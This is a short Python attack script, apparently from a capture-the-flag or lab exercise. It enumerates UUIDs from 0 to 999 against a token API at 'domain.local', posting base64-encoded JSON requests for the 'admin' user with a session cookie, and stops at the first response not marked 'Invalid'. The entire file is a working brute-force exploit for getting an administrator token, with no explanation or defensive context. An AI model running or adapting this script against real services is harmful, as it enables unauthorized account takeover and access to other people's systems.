#!/usr/bin/python3
import requests
import base64
import sys
from pwn import log

bar = log.progress("uuid")

target = "http://domain.local/api/v4/tokens/get"

cookies = {
    "session": "Yourcookie"
}
headers = {"Content-Type": "application/json"}

for uuid in range(0, 1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    encoded_data = base64.b64encode(data.encode('ascii')).decode('ascii')
    json_data = {"data": encoded_data}

    request = requests.post(target, headers=headers, cookies=cookies, json=json_data)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)
